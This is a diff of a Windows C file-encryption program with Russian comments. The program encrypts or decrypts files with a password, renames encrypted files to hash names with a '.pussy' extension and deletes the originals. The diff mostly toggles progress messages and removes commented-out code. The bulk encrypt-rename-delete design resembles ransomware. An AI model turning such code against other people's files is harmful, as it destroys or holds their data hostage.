@@ -6,7 +6,6 @@
 */
 
 #include <windows.h>
-#include <wincrypt.h>
 #include <stdio.h>
 
 #define SIZE_DATA 32768 //Размер входного массива байтов
@@ -83,14 +82,14 @@ SelectModeLoop:
 
             if(tMode == L'e')
             {
-                //wprintf(L"Encryption file: %ls...\n", MyFindFileName);
+                wprintf(L"Encryption file: %ls...\n", MyFindFileName);
 
                 if(!(MyFindFileName = RenameThisFile(MyFindFileName)))  //от перешифровки
                     continue;
 
                 if(!errorFlag)
                     EncryptMyFile(MyFindFileName, password);
-                //if(!errorFlag) wprintf(L"Encryption was successful!\n\n");
+                if(!errorFlag) wprintf(L"Encryption was successful!\n\n");
 
                 //Удаляем файл
                 if(!errorFlag)
@@ -101,10 +100,10 @@ SelectModeLoop:
             }
             if(tMode == L'd')
             {
-                ////wprintf(L"Decryption file: %ls...\n", MyFindFileName);
+                wprintf(L"Decryption file: %ls...\n", MyFindFileName);
                 if(!errorFlag)
                     DecryptMyFile(MyFindFileName, password);
-                //if(!errorFlag) wprintf(L"\nDecryption was successful!\n\n");
+                if(!errorFlag) wprintf(L"\nDecryption was successful!\n\n");
 
                 //Удаляем файл
                 if(!errorFlag)
@@ -153,16 +152,6 @@ void EncryptMyFile(LPTSTR _wszNameFile, LPTSTR _password)
 
     //----------------------Формируем имена файлов-----------------------------
 
-    //*************************************
-    //LPCTSTR? RenameThisFile(?);!!!*************** //Добавить надо функциональность
-    //*************************************
-  ////////&&&&&&&&&&&&&&&&&&&&???????????????????
-  ///
-  ///
-  ///
-  ///
-  ///
-  ///
     WCHAR *wszNameFile = _wszNameFile;//RenameThisFile(_wszNameFile);
     //RenameThisFile(_wszNameFile);
     WCHAR wszNameFileEncrypt[MAX_PATH];
@@ -172,17 +161,6 @@ void EncryptMyFile(LPTSTR _wszNameFile, LPTSTR _password)
     wcscat(wszNameFileEncrypt, wszExpansion);
 
     //-----------------------------------------------------------------------
-
-//    size_t len1 = wcscspn(wszNameFile, wszExpansion);
-//    size_t len2 = wcslen(wszNameFile);
-/*
-    if((wcscspn(wszNameFile, wszExpansion) + 6) == wcslen(wszNameFile)) //Для исключения повторного шифрования
-    {
-        //errorFlag++;
-        notDel = true;
-        return;
-    }
-*/
 
     //Открытие файлов
     f = _wfopen(wszNameFile, L"ab+" );              //исходный
@@ -485,7 +463,6 @@ Cleanup:
         if(_wremove(wszNameFileDecrypt) != 0)  // удаление файла
             wprintf(L"Error delete file!\n");
     }
-
 }
 
 void PrintDwData(BYTE *_dwData, size_t size)
@@ -561,17 +538,6 @@ LPTSTR RenameThisFile(LPTSTR _wszNameFile)
         strcat(sHash, spHash[i]);
     }
 
-    //Определяем полный путь к исполняемому файлу
-    //GetModuleFileNameA(GetModuleHandle(0), PathToExe, MAX_PATH);
-
-    //DWORD dPatnLen = MAX_PATH;
-    //char lpBuffer[dPatnLen];
-    //Удаляем название программы
- /*   for(DWORD i = 0; i < (strlen(PathToExe) - wcslen(WEXE_NAME)); i++)
-    {
-        PathToFile[i] = PathToExe[i];
-    }*/
-
     //Получаем путь текущей директории
     GetCurrentDirectoryA(MAX_PATH, PathToFile);
     strcat(PathToFile, "\\");
@@ -594,7 +560,7 @@ LPTSTR RenameThisFile(LPTSTR _wszNameFile)
     if(!strcmp(Expansion, ".pussy")) //от перешифровки
     {
         //errorFlag++;
-        wprintf(L"Error rechiper files!\n");
+        //wprintf(L"Error rechiper files!\n");
         return 0;
     }
 
@@ -606,9 +572,6 @@ LPTSTR RenameThisFile(LPTSTR _wszNameFile)
     strncpy(DestNameFile, PathToFile, MAX_PATH);  // ncpy для перезаписи static
     strcat(DestNameFile, sHash);
     strcat(DestNameFile, Expansion);
-
-    //printf("NameFile: %s\n", NameFile);
-
 
     //Переимеонвание файла
     if(!MoveFileA(NameFile, DestNameFile))
@@ -632,7 +595,7 @@ LPTSTR RenameThisFile(LPTSTR _wszNameFile)
     wcsncpy(wDestName, L"", MAX_PATH);
     mbstowcs(wDestName, strcat(sHash, Expansion), MAX_PATH);
 
-    wprintf(L"%s\n", wDestName);
+    //wprintf(L"%s\n", wDestName);
 
     return wDestName;
 }
